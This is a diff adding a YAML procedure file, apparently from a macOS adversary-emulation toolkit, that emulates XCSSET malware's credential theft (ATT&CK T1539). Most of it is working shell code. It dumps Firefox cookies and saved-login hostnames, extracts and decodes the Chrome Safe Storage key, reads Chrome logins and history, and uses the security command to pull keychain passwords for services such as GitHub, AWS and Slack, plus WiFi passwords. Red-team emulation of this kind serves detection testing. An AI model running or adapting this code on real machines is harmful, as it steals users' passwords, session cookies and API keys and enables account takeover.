@@ -1,0 +1,213 @@
+procedure_name: web_session_cookies
+ttp_id: T1539
+tactic: Credential Access
+guid: 7ec77beb-17fb-4eb4-813c-ad4f2eb0dca0
+intent: Steal web session cookies and browser credential data from macOS browsers,
+  emulating XCSSET malware credential theft techniques
+author: '@darmado | https://x.com/darmad0'
+version: 1.0.0
+created: '2025-05-28'
+updated: '2025-05-30'
+procedure:
+  arguments:
+  - option: -a|--all
+    description: Steal credentials from all supported browsers
+    execute_function:
+    - steal_firefox_cookies
+    - steal_chrome_credentials
+    - steal_safari_cookies
+  - option: -f|--firefox
+    description: Steal Firefox cookies and saved passwords
+    execute_function:
+    - steal_firefox_cookies
+  - option: -c|--chrome
+    description: Steal Chrome credentials and session data
+    execute_function:
+    - steal_chrome_credentials
+  - option: -s|--safari
+    description: Steal Safari keychain credentials
+    execute_function:
+    - steal_safari_cookies
+  global_variable:
+  - name: FIREFOX_PROFILES_PATH
+    type: string
+    default_value: ~/Library/Application Support/Firefox/Profiles
+  - name: CHROME_DATA_PATH
+    type: string
+    default_value: ~/Library/Application Support/Google/Chrome/Default
+  - name: SAFARI_COOKIES_PATH
+    type: string
+    default_value: ~/Library/Cookies
+  functions:
+  - name: steal_firefox_cookies
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+      check_permission:
+        type: directory
+        path: ~/Library/Application Support/Firefox
+        read: true
+        exit_on_failure: false
+    code: "steal_firefox_cookies() {\n    printf \"FIREFOX_COOKIES|accessing|Firefox\
+      \ profiles directory\\\\n\"\n    \n    # Find Firefox profiles - NO keychain\
+      \ access needed (DBs are not encrypted)\n    for profile in ~/Library/Application\\\
+      \ Support/Firefox/Profiles/*; do\n        if [ -d \"$profile\" ]; then\n   \
+      \         printf \"FIREFOX_PROFILE|found|$profile\\\\n\"\n            \n   \
+      \         # Extract cookies from cookies.sqlite (not encrypted - direct access)\n\
+      \            if [ -f \"$profile/cookies.sqlite\" ]; then\n                cookie_count=$(sqlite3\
+      \ \"$profile/cookies.sqlite\" \"SELECT COUNT(*) FROM moz_cookies;\" 2>/dev/null\
+      \ || echo \"0\")\n                printf \"FIREFOX_COOKIES|count|$cookie_count\\\
+      \\n\"\n                \n                # Extract actual cookie data (no decryption\
+      \ needed)\n                sqlite3 \"$profile/cookies.sqlite\" \"SELECT host,\
+      \ name, value, path, expiry FROM moz_cookies LIMIT 10;\" 2>/dev/null | while\
+      \ IFS='|' read -r host name value path expiry; do\n                    printf\
+      \ \"FIREFOX_COOKIE|%s|%s|%s|%s|%s\\\\n\" \"$host\" \"$name\" \"$value\" \"$path\"\
+      \ \"$expiry\"\n                done\n            fi\n            \n        \
+      \    # Extract saved passwords from logins.json (not encrypted - direct access)\n\
+      \            if [ -f \"$profile/logins.json\" ]; then\n                login_count=$(grep\
+      \ -o '\"hostname\"' \"$profile/logins.json\" 2>/dev/null | wc -l | tr -d ' ')\n\
+      \                printf \"FIREFOX_LOGINS|count|$login_count\\\\n\"\n       \
+      \         \n                # Extract hostnames from saved logins (no decryption\
+      \ needed)\n                grep -o '\"hostname\":\"[^\"]*\"' \"$profile/logins.json\"\
+      \ 2>/dev/null | sed 's/\"hostname\":\"//;s/\"//' | while read -r hostname; do\n\
+      \                    printf \"FIREFOX_LOGIN|hostname|%s\\\\n\" \"$hostname\"\
+      \n                done\n            fi\n        fi\n    done\n}\n"
+  - name: steal_chrome_credentials
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: true
+      check_permission:
+        type: directory
+        path: ~/Library/Application Support/Google/Chrome
+        read: true
+        exit_on_failure: false
+    code: "steal_chrome_credentials() {\n    printf \"CHROME_CREDENTIALS|accessing|Chrome\
+      \ data directory\\\\n\"\n    \n    chrome_dir=\"$HOME/Library/Application Support/Google/Chrome/Default\"\
+      \n    \n    if [ -d \"$chrome_dir\" ]; then\n        # Extract Chrome Safe Storage\
+      \ key for decryption (like XCSSET does)\n        printf \"CHROME_SAFE_STORAGE|extracting|Chrome\
+      \ encryption key\\\\n\"\n        chrome_key=$(security find-generic-password\
+      \ -ga \"Chrome\" 2>&1 | grep \"password:\" | sed 's/password: \"//' | sed 's/\"\
+      $//')\n        if [ -n \"$chrome_key\" ]; then\n            printf \"CHROME_SAFE_STORAGE|key|%s\\\
+      \\n\" \"$chrome_key\"\n            printf \"CHROME_SAFE_STORAGE|encoding|base64\\\
+      \\n\"\n            \n            # Decode the base64 key\n            decoded_key=$(echo\
+      \ \"$chrome_key\" | base64 -d 2>/dev/null | hexdump -ve '1/1 \"%.2x\"' || echo\
+      \ \"decode_failed\")\n            printf \"CHROME_SAFE_STORAGE|decoded|%s\\\\\
+      n\" \"$decoded_key\"\n        else\n            printf \"CHROME_SAFE_STORAGE|error|Key\
+      \ not found\\\\n\"\n        fi\n        \n        # Extract cookies (requires\
+      \ decryption with Safe Storage key)\n        if [ -f \"$chrome_dir/Cookies\"\
+      \ ]; then\n            cookie_size=$(stat -f%z \"$chrome_dir/Cookies\")\n  \
+      \          printf \"CHROME_COOKIES|found|%s bytes\\\\n\" \"$cookie_size\"\n\
+      \            \n            # Count encrypted cookies\n            cookie_count=$(sqlite3\
+      \ \"$chrome_dir/Cookies\" \"SELECT COUNT(*) FROM cookies;\" 2>/dev/null || echo\
+      \ \"0\")\n            printf \"CHROME_COOKIES|count|%s (encrypted)\\\\n\" \"\
+      $cookie_count\"\n            \n            # Show encrypted cookie data structure\n\
+      \            sqlite3 \"$chrome_dir/Cookies\" \"SELECT host_key, name, encrypted_value\
+      \ FROM cookies LIMIT 3;\" 2>/dev/null | while IFS='|' read -r host name encrypted;\
+      \ do\n                printf \"CHROME_COOKIE_ENCRYPTED|%s|%s|%s\\\\n\" \"$host\"\
+      \ \"$name\" \"$encrypted\"\n            done\n        fi\n        \n       \
+      \ # Extract saved passwords from Login Data (requires Safe Storage key)\n  \
+      \      if [ -f \"$chrome_dir/Login Data\" ]; then\n            login_size=$(stat\
+      \ -f%z \"$chrome_dir/Login Data\")\n            printf \"CHROME_LOGINS|found|%s\
+      \ bytes\\\\n\" \"$login_size\"\n            \n            # Extract login URLs\
+      \ and usernames (some data readable)\n            sqlite3 \"$chrome_dir/Login\
+      \ Data\" \"SELECT origin_url, username_value FROM logins LIMIT 10;\" 2>/dev/null\
+      \ | while IFS='|' read -r url username; do\n                printf \"CHROME_LOGIN|%s|%s\\\
+      \\n\" \"$url\" \"$username\"\n            done\n            \n            #\
+      \ Show encrypted password structure\n            sqlite3 \"$chrome_dir/Login\
+      \ Data\" \"SELECT origin_url, password_value FROM logins LIMIT 3;\" 2>/dev/null\
+      \ | while IFS='|' read -r url encrypted_pass; do\n                printf \"\
+      CHROME_PASSWORD_ENCRYPTED|%s|%s\\\\n\" \"$url\" \"$encrypted_pass\"\n      \
+      \      done\n        fi\n        \n        # Extract browsing history (not encrypted)\n\
+      \        if [ -f \"$chrome_dir/History\" ]; then\n            history_count=$(sqlite3\
+      \ \"$chrome_dir/History\" \"SELECT COUNT(*) FROM urls;\" 2>/dev/null || echo\
+      \ \"0\")\n            printf \"CHROME_HISTORY|count|%s\\\\n\" \"$history_count\"\
+      \n            \n            # Extract recent URLs (no decryption needed)\n \
+      \           sqlite3 \"$chrome_dir/History\" \"SELECT url, title, visit_count\
+      \ FROM urls ORDER BY last_visit_time DESC LIMIT 5;\" 2>/dev/null | while IFS='|'\
+      \ read -r url title visits; do\n                printf \"CHROME_HISTORY|%s|%s|%s\\\
+      \\n\" \"$url\" \"$title\" \"$visits\"\n            done\n        fi\n    else\n\
+      \        printf \"CHROME_CREDENTIALS|not_found|Chrome not installed\\\\n\"\n\
+      \    fi\n}\n"
+  - name: steal_safari_cookies
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: true
+      check_permission:
+        type: directory
+        path: ~/Library/Safari
+        read: true
+        exit_on_failure: false
+    code: "steal_safari_cookies() {\n    printf \"SAFARI_CREDENTIALS|accessing|Safari\
+      \ data\\\\n\"\n    \n    # Try to access Safari cookies (requires FDA permissions)\n\
+      \    safari_cookies=\"$HOME/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies\"\
+      \n    if [ -f \"$safari_cookies\" ]; then\n        cookie_size=$(stat -f%z \"\
+      $safari_cookies\")\n        printf \"SAFARI_COOKIES|found|%s bytes\\\\n\" \"\
+      $cookie_size\"\n        \n        # Extract readable strings from binary cookies\n\
+      \        cookie_domains=$(strings \"$safari_cookies\" | grep -E '\\.(com|org|net)'\
+      \ | head -10)\n        echo \"$cookie_domains\" | while read -r domain; do\n\
+      \            printf \"SAFARI_COOKIE|domain|%s\\\\n\" \"$domain\"\n        done\n\
+      \    else\n        # Try alternative location\n        alt_cookies=\"$HOME/Library/Cookies/Cookies.binarycookies\"\
+      \n        if [ -f \"$alt_cookies\" ]; then\n            cookie_size=$(stat -f%z\
+      \ \"$alt_cookies\")\n            printf \"SAFARI_COOKIES|found_alt|%s bytes\\\
+      \\n\" \"$cookie_size\"\n        fi\n    fi\n    \n    # Extract Safari history\n\
+      \    safari_history=\"$HOME/Library/Safari/History.db\"\n    if [ -f \"$safari_history\"\
+      \ ]; then\n        history_count=$(sqlite3 \"$safari_history\" \"SELECT COUNT(*)\
+      \ FROM history_items;\" 2>/dev/null || echo \"0\")\n        printf \"SAFARI_HISTORY|count|%s\\\
+      \\n\" \"$history_count\"\n        \n        # Extract recent URLs\n        sqlite3\
+      \ \"$safari_history\" \"SELECT url FROM history_items ORDER BY visit_time DESC\
+      \ LIMIT 5;\" 2>/dev/null | while read -r url; do\n            printf \"SAFARI_HISTORY|url|%s\\\
+      \\n\" \"$url\"\n        done\n    fi\n    \n    # XCSSET-style keychain credential\
+      \ extraction\n    printf \"KEYCHAIN_EXTRACTION|starting|Extracting saved passwords\\\
+      \\n\"\n    \n    # Extract generic passwords (app passwords, API keys, etc.)\n\
+      \    printf \"KEYCHAIN_GENERIC|extracting|Generic passwords\\\\n\"\n    security\
+      \ find-generic-password -g 2>&1 | while read -r line; do\n        if echo \"\
+      $line\" | grep -q \"password:\"; then\n            password=$(echo \"$line\"\
+      \ | sed 's/password: \"//' | sed 's/\"$//')\n            printf \"KEYCHAIN_GENERIC|password|%s\\\
+      \\n\" \"$password\"\n        elif echo \"$line\" | grep -q \"acct\"; then\n\
+      \            account=$(echo \"$line\" | sed 's/.*\"acct\"<blob>=\"//;s/\".*//')\n\
+      \            printf \"KEYCHAIN_GENERIC|account|%s\\\\n\" \"$account\"\n    \
+      \    elif echo \"$line\" | grep -q \"svce\"; then\n            service=$(echo\
+      \ \"$line\" | sed 's/.*\"svce\"<blob>=\"//;s/\".*//')\n            printf \"\
+      KEYCHAIN_GENERIC|service|%s\\\\n\" \"$service\"\n        fi\n    done\n    \n\
+      \    # Extract internet passwords (website credentials)\n    printf \"KEYCHAIN_INTERNET|extracting|Internet\
+      \ passwords\\\\n\"\n    security find-internet-password -g 2>&1 | while read\
+      \ -r line; do\n        if echo \"$line\" | grep -q \"password:\"; then\n   \
+      \         password=$(echo \"$line\" | sed 's/password: \"//' | sed 's/\"$//')\n\
+      \            printf \"KEYCHAIN_INTERNET|password|%s\\\\n\" \"$password\"\n \
+      \       elif echo \"$line\" | grep -q \"acct\"; then\n            account=$(echo\
+      \ \"$line\" | sed 's/.*\"acct\"<blob>=\"//;s/\".*//')\n            printf \"\
+      KEYCHAIN_INTERNET|account|%s\\\\n\" \"$account\"\n        elif echo \"$line\"\
+      \ | grep -q \"srvr\"; then\n            server=$(echo \"$line\" | sed 's/.*\"\
+      srvr\"<blob>=\"//;s/\".*//')\n            printf \"KEYCHAIN_INTERNET|server|%s\\\
+      \\n\" \"$server\"\n        fi\n    done\n    \n    # Target specific high-value\
+      \ services like XCSSET does\n    printf \"KEYCHAIN_TARGETED|extracting|High-value\
+      \ targets\\\\n\"\n    \n    # Common targets that XCSSET looks for\n    high_value_services=(\"\
+      github\" \"aws\" \"google\" \"apple\" \"microsoft\" \"slack\" \"docker\" \"\
+      npm\")\n    \n    for service in \"${high_value_services[@]}\"; do\n       \
+      \ # Try to extract specific service credentials\n        cred_data=$(security\
+      \ find-generic-password -s \"$service\" -g 2>&1 || true)\n        if echo \"\
+      $cred_data\" | grep -q \"password:\"; then\n            password=$(echo \"$cred_data\"\
+      \ | grep \"password:\" | sed 's/password: \"//' | sed 's/\"$//')\n         \
+      \   printf \"KEYCHAIN_TARGETED|%s|password|%s\\\\n\" \"$service\" \"$password\"\
+      \n        fi\n        \n        account=$(echo \"$cred_data\" | grep \"acct\"\
+      \ | sed 's/.*\"acct\"<blob>=\"//;s/\".*//' || true)\n        if [ -n \"$account\"\
+      \ ]; then\n            printf \"KEYCHAIN_TARGETED|%s|account|%s\\\\n\" \"$service\"\
+      \ \"$account\"\n        fi\n    done\n    \n    # Extract WiFi passwords (common\
+      \ XCSSET target)\n    printf \"KEYCHAIN_WIFI|extracting|WiFi passwords\\\\n\"\
+      \n    security find-generic-password -D \"AirPort network password\" -g 2>&1\
+      \ | while read -r line; do\n        if echo \"$line\" | grep -q \"password:\"\
+      ; then\n            wifi_password=$(echo \"$line\" | sed 's/password: \"//'\
+      \ | sed 's/\"$//')\n            printf \"KEYCHAIN_WIFI|password|%s\\\\n\" \"\
+      $wifi_password\"\n        elif echo \"$line\" | grep -q \"acct\"; then\n   \
+      \         wifi_network=$(echo \"$line\" | sed 's/.*\"acct\"<blob>=\"//;s/\"\
+      .*//')\n            printf \"KEYCHAIN_WIFI|network|%s\\\\n\" \"$wifi_network\"\
+      \n        fi\n    done\n} "
